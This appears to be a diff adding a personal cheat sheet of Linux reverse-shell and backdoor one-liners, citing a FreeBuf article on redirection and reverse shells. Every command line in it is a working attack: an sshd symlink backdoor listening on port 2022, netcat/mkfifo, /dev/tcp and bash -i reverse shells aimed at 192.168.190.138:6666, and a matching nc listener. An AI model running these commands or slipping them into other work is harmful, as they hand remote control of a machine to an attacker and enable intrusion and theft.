@@ -1,0 +1,12 @@
+ln -sf /usr/sbin/sshd /tmp/su;nohup /tmp/su -oPort=2022 &
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.190.138 6666>/tmp/f
+
+exec 5<>/dev/tcp/192.168.190.138/6666;cat <&5|while read line;do $line>&5 2>&1;done
+
+bash -i>& /dev/tcp/192.168.190.138/6666 0>&1
+
+nc -lvvp 6666
+
+浅析重定向与反弹Shell命令
+http://www.freebuf.com/articles/system/153986.html
